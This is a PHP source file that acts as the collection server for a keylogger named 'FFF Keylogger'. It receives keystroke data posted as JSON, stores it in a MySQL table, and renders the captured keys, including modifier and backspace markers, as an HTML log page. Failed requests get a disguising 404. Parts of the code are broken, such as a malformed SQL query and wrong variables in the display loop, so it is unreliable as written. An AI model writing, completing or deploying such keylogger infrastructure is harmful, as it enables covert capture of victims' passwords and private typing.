<?php
/*
	Log Collection For FFF Keylogger
*/


class ServerLogger
{
	var $db = array(
		'host'		=> 'localhost',
		'user'		=> 'root',
		'password'	=> '',
		'database'	=> 'mailing_list',
		'table'		=> 'maile',
	);

	var $connection = null;
	
	function set_db($db, $value = null)
	{
		if ( empty( $db ) )
		{
			return false;
		}
	
		if ( is_array( $db ) )
		{
			foreach( $db as $f => $v )
			{
				if ( isset( $this->db[ $f ] ) )
				{
					$this->db[ $f ] = $v;
				}
			}
		}
		elseif( isset( $this->db[$db] ) )
		{
			$this->db[$db] = $value;
			
			return true;
		}
		
		return false;
	}	
	
	function set_field($field, $value)
	{
		$this->data[$field] = $value;
	}
	
	function __destruct()
	{
		if (!empty( $this->connection ))
		{
			mysql_close( $this->connection );
		}
	}
	
	function __construct( $post = array() )
	{
		if (empty( $post ) || empty($post->data))
		{
			return;
		}
		$this->set_field( 'data', $post->data );
	}
	
	function insert_to_db()
	{
		$this->connection = @mysql_connect($this->db['host'],$this->db['user'],$this->db['password']);
		@mysql_select_db( $this->db['database'] );

		$fields = array();
		$values = array();
		foreach( $this->data as $field => $value )
		{
			$fields[] = '`' . $field . '`';
			$values[] = "'" . mysql_real_escape_string($value) . "'";
		}
		$query = "INSERT INTO `{$this->db['table']}` (". implode(',', $fields ) .") VALUES (" . implode(',', $values ) . ")";
		echo $query;
		return @mysql_query($query);
	}
	
	function present_log()
	{
		$this->connection = @mysql_connect($this->db['host'],$this->db['user'],$this->db['password']);
		@mysql_select_db( $this->db['database'] );
		$result = @mysql_query("SELECT time, data from `{$this->db['table']}` ORDER time DESC");
		while($row = mysql_fetch_row($result))
		{
			echo "<h1>{$result[0]}</h1>{$result[0]}"; 
		}
		
	}

}

header("Content-type: text/plain");
$x = new ServerLogger( json_decode($HTTP_RAW_POST_DATA) );
$x->set_db ( array(
	'host'		=> '',
	'user'		=> '',
	'password'	=> '',
	'database'	=> '',
	'table'		=> 'keylogger', # 2 columns: time(timestamp), data (longtext)
) );


if(isset($_GET['show']))
{
	echo '<!DOCTYPE html><html><head><meta charset="utf-8">'
	.'<style>'
	.'i{font-style:normal;border:1px solid #bbb;border-radius:3px;letter-spacing:-1px;margin-right:1px;padding:0 2px;} '
	.'i i{border:none;padding:0;margin:0} '
	.'i[bs]:after{color:red;content:"BS"} '
	.'i[tab]:after{color:gray;content:"tab"} '
	.'i[shift]:before{content:"shift+"} '
	.'i[alt]:before{content:"alt+"} '
	.'i[ctrl]:before{content:"ctrl+"} '
	.'i[shift],i[alt],i[ctrl],i[shiftctrl],i[shiftaltctrl],i[shiftalt],i[altctrl] {color:green}'
	.'i[shiftctrl]:before {content:"shift+ctrl+"} '
	.'i[shiftaltctrl]:before {content:"shift+alt+ctrl+"} '
	.'i[shiftalt]:before {content:"shift+alt+"} '
	.'i[altctrl]:before {content:"alt+ctrl+"} '
	.'</style>'
	.'</head><body style="font-family:monospace;line-height:20px;font-size:13px">'
	.$x->present_log()
	
	.'</body></html>' . "\n";

	die();
}
else
{
	if(!$x->insert_to_db())
	{
		header('HTTP/1.0 404 Not Found');
	}
}